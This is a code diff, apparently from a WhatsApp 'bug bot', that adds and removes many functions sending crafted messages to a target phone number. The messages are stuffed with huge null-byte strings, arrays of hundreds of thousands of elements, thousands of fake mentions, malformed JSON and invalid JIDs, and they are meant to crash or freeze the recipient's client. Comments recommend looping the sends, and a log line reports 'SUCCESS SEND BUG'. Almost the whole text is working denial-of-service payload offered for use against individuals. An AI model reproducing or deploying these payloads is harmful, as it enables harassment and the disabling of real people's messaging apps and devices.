+    const wowo = {
+      viewOnceMessage: {
+        message: {
+          orderMessage: {
+            orderId: "D-" + Date.now(),
+            itemCount: null,
+            status: "SUCCES",
+            surface: "CATALOG",
+            message: " ?⃟꙰ LU ✶⤻꙳‌‌༑ᐧ‌⌁⃰HAMA 🍷",
+            token: "\u0000".repeat(40000),
+            sellerJid: sock.user.id.split(':')[0] + '@s.whatsapp.net',
+            nativeFlowMessage: {
+              buttons: [{
+                name: "payment_info",
+                buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
+              }]
             }
           }
         }
@@ -2141,1150 +3695,128 @@ async function lahora(sock, target) {
     };
 
     const msg2 = {
-      interactiveMessage: {
-        body: {
-          text: "anjykonyol"
-        },
-        nativeFlowMessage: {
-          buttons: "crash_msg" +
-                   "\0".repeat(20000) +
-                   "\u0000".repeat(1000) +
-                   "\u0000".repeat(30000) +
-                   "\u0000".repeat(4000)
-        }
-      }
-    };
-
-    const msg3 = {
-      interactiveMessage: {
-        body: {
-          text: "meta ai"
-        },
-        nativeFlowMessage: {
-          buttons: {
-            name: "meta_mesaage",
-            buttonParamsJson: "\0".repeat(20000) +
-                              "\u0000".repeat(1000) +
-                              "\u0000".repeat(4000)
-          }
-        }
-      }
-    };
-
-    const msg4 = {
-      interactiveMessage: {
-        body: {
-          text: "pppppmeta ai nih bos".repeat(20000)
-        },
-        nativeFlowMessage: {
-          buttons: "[".repeat(50001)
-        },
-        contextInfo: {
-          mentionedJid: [target],
-          isForwarded: true,
-          forwardingScore: 999
-        }
-      }
-    };
-
-    await sock.relayMessage(target, msg1, { viewOnce: true });
-    await sock.relayMessage(target, msg2, {});
-    await sock.relayMessage(target, msg3, {});
-    await sock.relayMessage(target, msg4, {});
-
-    await sock.relayMessage(target, {
-      groupStatusMessageV2: {
-        message: {
-          interactiveResponseMessage: {
-            body: {
-              text: "\x10".repeat(500000),
-              title: "\r".repeat(2000),
-              format: "DEFAULT"
-            },
-            nativeFlowResponseMessage: {
-              buttons: Array.from({ length: 500000 }, () => ({}))
-            },
-            contextInfo: {
-              mentionedJid: [
-                "0@s.whatsapp.net",
-                ...Array.from({ length: 1999 }, () =>
-                  "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
-                )
-              ]
-            },
-            viewOnceMessage: {
-              message: {
-                text: "\u0000".repeat(50000)
-              }
-            }
-          }
-        }
-      }
-    }, {});
-
-    console.log("✅ LURUS G MOKAD BY HANZ SENT!");
-  } catch (e) {
-    console.log("❌ ERROR: MAK LU SINI NGEWE", e.message);
-  }
-}
-/*
-async function iosXvLocX(sock, target) {
-  const msg = generateWAMessageFromContent(
-    target,
-    {
       viewOnceMessage: {
         message: {
-          locationMessage: {
-            degreesLatitude: Infinity,
-            degreesLongitude: -Infinity,
-            jpegThumbnail: null,
-            name: "鈥硷笍 .r4LdzHeLL 鈥硷笍" + "饝噦饝喌饝喆饝喛饝喛".repeat(15000),
-            url: `https://crash-ios.${"饝噦饝喌饝喆饝喛".repeat(15000)}.com/${"饝噦饝喌饝喆饝喛".repeat(15000)}.html/`,
-            contextInfo: {
-              urlTrackingMap: {
-                urlTrackingMapElements: Array.from(
-                  { length: 200900 },
-                  (_, r4LdzHeLL) => ({ type: 1 })
-                )
-              }
-            }
-          },
-        },
-      },
-    },
-    {}
-  );
-
-  for (let i = 0; i < 5; i++) {
-    await sock.relayMessage("status@broadcast", msg.message, {
-      messageId: msg.key.id,
-      statusJidList: [target],
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [
-                {
-                  tag: "to",
-                  attrs: { jid: target },
-                  content: undefined,
-                },
-              ],
-            },
-          ],
-        },
-      ],
-    });
-  };
-  await sleep(1000)
-}*/
-async function forceout(sock, target) {
-  try {
-    let msg = await generateWAMessageFromContent(
-      target,
-      {
-        botInvokeMessage: {
-          message: {
-            messageContextInfo: {
-              messageSecret: crypto.randomBytes(16),
-              deviceListMetadata: {},
-              deviceListMetadataVersion: 2
-            },
-            interactiveResponseMessage: {
-              contextInfo: {
-                paticipant: target,
-                remoteJid: "0@s.whatsappp.net",
-                isForwarded: true,
-                forwardingScore: 9999,
-                mentionedJid: Array.from({ length: 1000 }, (_, r4) => `628${666 + r4}@s.whatsapp.net`),
-                fromMe: true,
-                forwardedAiBotMessageInfo: {
-                  botJid: "13135550202@bot",
-                  botName: "Meta AI",
-                  creator: "Meta"
-                },
-                statusAttributionType: 2,
-                statusAttributions: Array.from({ length: 200900 }, (_, z) => ({
-                  type: 1
-                }))
-              },
-              body: {
-                text: "X",
-                format: "DEFAULT"
-              },
-              nativeFlowResponseMessage: {
-                name: "call_permission_request",
-                paramsJson: "\u0000".repeat(15000),
-                version: 3
-              }
-            }
-          }
-        }
-      }, 
-      { userJid: target }
-    );
-    
-    await sock.relayMessage(target, msg.message, {
-      messageId: msg.key.id,
-      participant: { jid: target }
-    });
-    
-    await sock.relayMessage("status@broadcast", msg.message, {
-      messageId: msg.key.id,
-      statusJidList: [target],
-      additionalNodes: [{
-        tag: "meta",
-        attrs: { status_setting: "contacts" },
-        content: [{
-          tag: "mentioned_users",
-          attrs: {},
-          content: [{
-            tag: "to",
-            attrs: { jid: target },
-            content: undefined
-          }]
-        }]
-      }]
-    });
-  } catch (err) {
-    console.error(err);
-  }
-}
-async function ofmSqLite(sock, target) {
-  for (let i = 0; i < 10; i++) {
-    await sock.relayMessage("status@broadcast",
-      {
-        botInvokeMessage: {
-          message: {
-            messageContextInfo: {
-              messageSecret: crypto.randomBytes(32),
-              deviceListMetadata: {
-                senderKeyIndex: 0,
-                senderTimestamp: Date.now(),
-                recipientKeyIndex: 0
-              },
-              deviceListMetadataVersion: 2
-            },
-            interactiveResponseMessage: {
-              body: {
-                text: "\x10\x10\x10" + ".r4LdzHeaven ∞ 7eppeli.pdf",
-                format: "DEFAULT"
-              },
-              nativeFlowResponseMessage: {
-                name: "call_permission_request",
-                paramsJson: "{ \"X\": { \"status\": \"\0\" } }",
-                version: 3
-              },
-              contextInfo: {
-                participant: sock.user.id,
-                remoteJid: "\0",
-                fromMe: true,
-                statusAttributionType: 2,
-                statusAttributions: Array.from({ length: 200666 }, 
-                  (_, R4) => ({ 
-                    participant: `628${R4 + 666}@s.whatsapp.net`, 
-                    type: 1
-                  })
-                ),
-              }
-            }
-          }
-        }
-      },
-      {
-        statusJidList: [target],
-        additionalNodes: [
-          {
-            tag: "meta",
-            attrs: { status_setting: "allowlist" },
-            content: [
-              {
-                tag: "mentioned_users",
-                attrs: {},
-                content: [
-                  {
-                    tag: "to",
-                    attrs: { jid: target },
-                    content: []
-                  }
-                ]
-              }
-            ]
-          }
-        ]
-      }
-    )
-  }
-  await sleep(1000)
-}
-async function iNTxSqL(sock, target) {
-  let invalidJid = "@RaldzzXyz $$$ @voidp $$$ @rraldz";
-  for (let i = 0; i < 10; i++) {
-    await sock.relayMessage("status@broadcast",
-      {
-        interactiveResponseMessage: {
-          body: {
-            text: "\x10.r4LdzHeaven 👁‍🗨",
-            format: "EXTENSIONS_1"
-          },
-          nativeFlowResponseMessage: {
-            name: (["address_message","call_permission_request"][(i + (Math.random() < 0.5 ? 1 : 0)) % 2]),
-            paramsJson: "{".repeat(1),
-            version: 3
-          },
-          contextInfo: {
-            remoteJid: invalidJid,
-            mentionedJid: invalidJid,
-            parentGroupJid: invalidJid,
-            businessMessageForwardInfo: {
-              businessOwnerJid: invalidJid
-            },
-            quotedMessage: {
-              conversation: {
-                lidJid: invalidJid,
-                pnJid: invalidJid,
-                oldJid: invalidJid,
-                newJid: invalidJid
-              }
-            },
-            urlTrackingMap: {
-              urlTrackingMapElements: Array.from(
-                { length: 200900 },
-                (_, r4LdzHeLL) => ({ type: 1 })
-              )
-            }
-          }
-        }
-      },
-      {
-        statusJidList: [target],
-        additionalNodes: [
-          {
-            tag: "meta",
-            attrs: { status_setting: "allowlist" },
-            content: [
-              {
-                tag: "mentioned_users",
-                attrs: {},
-                content: [
-                  {
-                    tag: "to",
-                    attrs: { jid: target },
-                    content: []
-                  }
-                ]
-              }
-            ]
-          }
-        ]
-      }
-    );
-  }
-  await sleep(1000);
-}
-
-// pemanggilan
-
-// recommended looping
-async function inTers6(sock, target) {
-  for (let i = 0; i < 10; i++) {
-    await sock.relayMessage(
-      "status@broadcast",
-      {
-        interactiveResponseMessage: {
-          body: {
-            text: "\x10t.me/RaldzzXyz",
-            format: "DEFAULT"
-          },
-          nativeFlowResponseMessage: {
-            name: "address_message",
-            paramsJson: "{",
-            version: 3
-          },
-          contextInfo: {
-            remoteJid: " @RaldzzXyz $$$ @voidp $$ @rraldz ",
-            urlTrackingMap: {
-              urlTrackingMapElements: Array.from(
-                { length: 900000 },
-                () => ({ type: 1 })
-              )
-            }
-          }
-        }
-      },
-      {
-        statusJidList: [target],
-        additionalNodes: [
-          {
-            tag: "meta",
-            attrs: { status_setting: "allowlist" },
-            content: [
-              {
-                tag: "mentioned_users",
-                attrs: {},
-                content: [
-                  {
-                    tag: "to",
-                    attrs: { jid: target },
-                    content: []
-                  }
-                ]
-              }
-            ]
-          }
-        ]
-      }
-    );
-  };
-  await sleep(1000)
-}
-
-// recommended looping
-async function OnlyQuotaZ(sock, target) {
-  try {
-    let msg = await generateWAMessageFromContent(target, {
-      interactiveMessage: {
-        header: {
-          hasMediaAttachment: true,
-          videoMessage: {
-      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356713_n.enc?ccb=11-4",
-      mimetype: "video/mp4",
-      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
-      fileLength: "289511",
-      seconds: 9999,
-      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
-      caption: "X",
-      height: 9999,
-      width: 620,
-      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
-      directPath:
-        "/v/t62.7161-24/13158969_599169879950168_4005798415047356713_n.enc",
-      mediaKeyTimestamp: "1755695348"
-          }
-        },
-        body: { text: "!" },
-        contextInfo: {
-            mentionedJid: [
-                   "0@s.whatsapp.net",
-                      ...Array.from(
-                      { length: 1900 },
-                      () => 
-                      "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-                       )
-                   ]
-                },
-              nativeFlowMessage: {
-                buttons: [
-                {
-                  name: "galaxy_message",
-                  paramsJson: "\u0000".repeat(3000)
-                }
-             ]
-          }
-        }
-      }, {});
-      
-    await sock.relayMessage(target, {
-    groupStatusMessageV2: {
-      message: msg.message
-    }
-  },
-  {
-    participant: { jid: target },
-    messageId: msg.key.id
-  });
-  
-  let Message = await generateWAMessageFromContent(target, {
-    stickerMessage: {
-        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
-        mimetype: "image/webp",
-        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
-        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
-        fileLength: 999,
-        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
-        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
-         mediaKeyTimestamp: Math.floor(Date.now() / 999),
-         isAnimated: true,
-         isAvatar: null,
-         isAiSticker: true,
-         isLottie: false,
-         height: 512,
-         width: 512,
-          contextInfo: {
-            remoteJid: "status@broadcast",
-            participant: target,
-            externalAdReply: {},
-            quotedMessage: {
-              ImageMessage: {
-               url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c&mms3=true",
-            mimetype: "image/jpeg",
-            fileSha256: Buffer.from("CrP44RkJbl+shQQxxlJ6s0SAAcOWqWgxw3iEiGi3zZI=", "base64"),
-            fileLength: "59668",
-            height: 736,
-            width: 736,
-            mediaKey: Buffer.from("YRUaXE2466bqWOmhGwPxA6bC3Qif2tTFmsJ/Q+49ijc=", "base64"),
-            fileEncSha256: Buffer.from("rTAiyS+goq3w37k70/mwSiCVRUFjD66uanaabunAG8w=", "base64"),
-            directPath: "/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c",
-            mediaKeyTimestamp: "1753601096",
-            jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD...", "base64")
-              }
-            }
-          }
-        }
-      }, {});
-      
-      await sock.relayMessage(target, {
-    groupStatusMessageV2: {
-      message: Message.message
-    }
-  },
-  {
-    participant: { jid: target },
-    messageId: Message.key.id
-  });
-  } catch (err) {
-    console.log(`SUCCESS SEND BUG: ${target}`);
-  }
-    };
-    
-async function lockMessages(sock, target) {
-    const zephyrineMessages = await generateWAMessageFromContent(
-        target,
-        {
-            viewOnceMessage: {
-                message: {
-                    interactiveMessage: {
-                        header: {
-                            title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
-
-                            documentMessage: {
-                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
-                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-                                fileLength: "9999999999999",
-                                pageCount: 9007199254740991,
-                                mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
-                                fileName: "\u0001",
-                                fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
-                                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
-                                mediaKeyTimestamp: "1723855952",
-                                contactVcard: true,
-                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
-                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
-                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
-                                jpegThumbnail: Buffer.alloc(0)
-                            },
-
-                            hasMediaAttachment: true
-                        },
-
-                        body: {
-                            text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩"
-                        },
-
-                        nativeFlowMessage: {
-                            messageParamsJson: "{".repeat(10000),
-
-                            buttons: [
-                                {
-                                    name: "single_select",
-                                    buttonParamsJson: JSON.stringify({
-                                        title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
-                                        sections: [{ title: "\r", rows: [] }]
-                                    })
-                                },
-                                {
-                                    name: "payment_method",
-                                    buttonParamsJson: "\u0010".repeat(2500)
-                                },
-                                {
-                                    name: "call_permission_request",
-                                    buttonParamsJson: "{}"
-                                },
-                                {
-                                    name: "payment_method",
-                                    buttonParamsJson: "{}"
-                                },
-                                {
-                                    name: "single_select",
-                                    buttonParamsJson: JSON.stringify({
-                                        title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
-                                        sections: [{
-                                            title: "\"\r".repeat(99999),
-                                            rows: []
-                                        }]
-                                    })
-                                },
-                                {
-                                    name: "galaxy_message",
-                                    buttonParamsJson: JSON.stringify({
-                                        flow_action: "navigate",
-                                        flow_action_payload: {
-                                            screen: "WELCOME_SCREEN"
-                                        },
-                                        flow_cta: "\"\r".repeat(99999),
-                                        flow_id: "1169834181134583",
-                                        flow_message_version: "3",
-                                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
-                                    })
-                                },
-                                {
-                                    name: "mpm",
-                                    buttonParamsJson: "{}"
-                                }
-                            ]
-                        }
+          interactiveMessage: {
+            nativeFlowMessage: {
+              buttons: [{
+                name: "payment_key_info",
+                buttonParamsJson: JSON.stringify({
+                  currency: "IDR",
+                  total_amount: {
+                    value: 0,
+                    offset: 100
+                  },
+                  reference_id: "\u0000".repeat(15000),
+                  type: "physical-goods",
+                  order: {
+                    status: "pending",
+                    subtotal: {
+                      value: 0,
+                      offset: 100
+                    },
+                    order_type: "ORDER",
+                    items: [{
+                      name: "Denis",
+                      amount: {
+                        value: 9999,
+                        offset: 100
+                      },
+                      quantity: -1,
+                      sale_amount: {
+                        value: 0,
+                        offset: 100
+                      }
+                    }]
+                  },
+                  payment_settings: [{
+                    type: "payment_key",
+                    payment_key: {
+                      type: "IDPAYMENTACCOUNT",
+                      key: "+62 85846287780",
+                      name: "DANA",
+                      institution_name: "DANA",
+                      full_name_on_account: "\0".repeat(150000)
                     }
-                }
-            }
-        },
-        {
-            userJid: target,
-            quoted: null
-        }
-    );
-
-    await sock.relayMessage(
-        target,
-        zephyrineMessages.message,
-        {
-            messageId: zephyrineMessages.key.id,
-            participant: { jid: target },
-            userJid: target
-        }
-    );
-}
-
-async function iNTofmSqL(sock, target) {
-  for (let i = 0; i < 10; i++) {
-    await sock.relayMessage("status@broadcast",
-      {
-        botInvokeMessage: {
-          message: {
-            messageContextInfo: {
-              messageSecret: crypto.randomBytes(32),
-              deviceListMetadata: {
-                senderKeyIndex: 0,
-                senderTimestamp: Date.now(),
-                recipientKeyIndex: 0
-              },
-              deviceListMetadataVersion: 2
-            },
-            interactiveResponseMessage: {
-              body: {
-                text: ".r4LdzHeaven ∞ 7eppeli.pdf",
-                format: "EXTENSIONS_1"
-              },
-              nativeFlowResponseMessage: {
-                name: (
-                  ["address_message", "call_permission_request", "galaxy_message"][(i + (Math.random() < 0.5 ? 1 : 0)) % 3]),
-                paramsJson: "\u0000".repeat(1),
-                version: 3
-              },
-              contextInfo: {
-                participant: sock.user.id,
-                remoteJid: "@RaldzzXyz ∞ @ZeppeliPdf",
-                fromMe: true,
-                statusAttributionType: 2,
-                urlTrackingMap: {
-                  urlTrackingMapElements: Array.from(
-                    { length: 500000 },
-                    () => ({ type: 1 })
-                  )
-                }
-              }
+                  }],
+                  share_payment_status: true,
+                  is_soft_deleted: true,
+                  referral: "chat_attachment"
+                })
+              }]
             }
           }
         }
-      },
-      {
-        statusJidList: [target],
-        additionalNodes: [
-          {
-            tag: "meta",
-            attrs: { status_setting: "allowlist" },
-            content: [
-              {
-                tag: "mentioned_users",
-                attrs: {},
-                content: [
-                  {
-                    tag: "to",
-                    attrs: { jid: target },
-                    content: []
-                  }
-                ]
-              }
-            ]
-          }
-        ]
       }
-    )
+    };
+
+    await sock.relayMessage(target, dens, {
+      messageId: "MSG-" + Date.now()
+    });
+
+    await sock.relayMessage(target, wowo, {
+      messageId: "MSG-" + Date.now()
+    });
+
+    await sock.relayMessage(target, msg2, {
+      messageId: "MSG-" + Date.now(),
+      additionalNodes: [{
+        tag: "biz",
+        attrs: {
+          native_flow_name: "payment_key_info"
+        }
+      }]
+    });
+
+  } catch (error) {
+    console.error('Error:', error.message);
   }
-  await sleep(1000)
 }
 
-// pemanggilan
-
-async function iOSExe(sock, target) {
-  await sock.relayMessage(
-    target,
-    {
-      stickerPackMessage: {
-        stickerPackId: "X",
-        name: "./hyuuXxsad" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
-        publisher: "./hyuuXxBukanDep" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
-        stickers: [
-          {
-            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "woi",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "pppp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "maklo",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "pp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "ppp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "ppp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "pppp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "ppp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "pppp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-          {
-            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
-            isAnimated: false,
-            emojis: ["🀄"],
-            accessibilityLabel: "pppp",
-            isLottie: true,
-            mimetype: "application/pdf",
-          },
-        ],
-        fileLength: "999999",
-        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
-        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
-        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
-        directPath:
-          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
-        contextInfo: {
-          quotedMessage: {
-                paymentInviteMessage: {
-                  serviceType: 3,
-                  expiryTimestamp: Date.now() + 1814400000
-                },
-                forwardedAiBotMessageInfo: {
-                  botName: "META AI",
-                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
-                  creatorName: "Bot"
-                }
-            }
-        },
-        packDescription: "./diki" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
-        mediaKeyTimestamp: "1741150286",
-        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
-        thumbnailDirectPath:
-          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
-        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
-        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
-        thumbnailHeight: 252,
-        thumbnailWidth: 252,
-        imageDataHash:
-          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
-        stickerPackSize: "999999999",
-        stickerPackOrigin: "1",
-      },
-    }, { participant: { jid: target } });
-}
-
-async function inviteUI(sock, target) {
-await sock.relayMessage(target, {
-"extendedTextMessage": {
-"text": "DENIS SUKA MMK" + "ꦽ".repeat(50000),
-"previewType": "NONE",
-"contextInfo": {
-"mentionedJid": [
-target
-]
-},
-"inviteLinkGroupTypeV2": "DEFAULT"
-}
-}, {
-participant: { jid: target }
-});
-}
-async function xvsp(sock,target) {
-  await sock.relayMessage("status@broadcast",
-    {
-      interactiveResponseMessage: {
-        body: {
-          text: "x",
-          format: "DEFAULT"
-        },
-        nativeFlowResponseMessage: {
-          name: "call_permission_request",
-          paramsJson: "{",
-          version: 3
-        },
-        contextInfo: {
-          urlTrackingMap: {
-            urlTrackingMapElements: Array.from(
-              { length: 200900 },
-              () => ({ type: 1 })
-            )
-          }
-        }
-      }
-    },
-    {
-      statusJidList: [target],
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: { status_setting: "allowlist" },
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [
+async function smsl(sock, target) {
+ await sock.relayMessage(target, {
+     interactiveMessage: {
+       body: {
+         text: "ytim"
+            },
+            nativeFlowMessage: {
+              buttons: [
                 {
-                  tag: "to",
-                  attrs: { jid: target },
-                  content: []
-                }
-              ]
-            }
-          ]
-        }
-      ]
-    }
-  );
-}
-async function PayLink(sock, target) {
-  const msg = generateWAMessageFromContent(target, {
-    groupStatusMessageV2: {
-      message: {
-        extendedTextMessage: {
-          text: " ./R4LDZ EXE", 
-          previewType: 6,
-          contextInfo: {
-            mentionedJid: Array.from({ length: 100 }, (_, z) => `628${z + 1}@s.whatsapp.net`)
-          },
-          paymentLinkMetadata: {
-            button: {
-              displayText: "Bro?"
-            }, 
-            header: {
-              headerType: 2
-            }, 
-            provider: {
-              paramsJson: "{".repeat(10000) 
-            }
-          }
-        }
-      }
-    }
-  }, {});
-  await sock.relayMessage(target, msg.message, {
-    participant: { jid: target }
-  }) 
-}
+                  name: "booking_status",
+                 ParamsJson: "\u0000".repeat(500000),
+               },
+             ],
+           },
+         },
+       }, { participant: { jid: target }});
+     }
 
-
-async function inTers(sock, target) {
-  try {
-  const currentRepeatCount = 522500;  
-  const msg1 = await generateWAMessageFromContent(target, {
-      viewOnceMessage: {
-        message: {
-          interactiveResponseMessage: {
-            body: { text: ".menu", format: "DEFAULT" },
-            nativeFlowResponseMessage: {
-              name: "galaxy_message",
-              paramsJson: "\u0000".repeat(currentRepeatCount),
-              version: 3
-            },
-            contextInfo: {
-              entryPointConversionSource: "call_permission_request"
-            }
-          }
-        }
-      }
-    }, {
-      userJid: target,
-      messageId: undefined,
-      messageTimestamp: (Date.now() / 1000) | 0
-    });
-
-    await sock.relayMessage("status@broadcast", msg1.message, {
-      messageId: msg1.key?.id || undefined,
-      statusJidList: [target],
-      additionalNodes: [{
-        tag: "meta",
-        attrs: {},
-        content: [{
-          tag: "mentioned_users",
-          attrs: {},
-          content: [{ tag: "to", attrs: { jid: target } }]
-        }]
-      }]
-    }, { participant: target });
-
-    const msg2 = await generateWAMessageFromContent(target, {
-      viewOnceMessage: {
-        message: {
-          interactiveResponseMessage: {
-            body: { text: "x", format: "BOLD" },
-            nativeFlowResponseMessage: {
-              name: "galaxy_message",
-              paramsJson: "\u0000".repeat(currentRepeatCount),
-              version: 3
-            },
-            contextInfo: {
-              entryPointConversionSource: "call_permission_request"
-            }
-          }
-        }
-      }
-    }, {
-      userJid: target,
-      messageId: undefined,
-      messageTimestamp: (Date.now() / 1000) | 0
-    });
-
-    await sock.relayMessage("status@broadcast", msg2.message, {
-      messageId: msg2.key?.id || undefined,
-      statusJidList: [target],
-      additionalNodes: [{
-        tag: "meta",
-        attrs: {},
-        content: [{
-          tag: "mentioned_users",
-          attrs: {},
-          content: [{ tag: "to", attrs: { jid: target } }]
-        }]
-      }]
-    }, { participant: target });
-
-    const Audio = {
-      message: {
-        ephemeralMessage: {
-          message: {
-            audioMessage: {
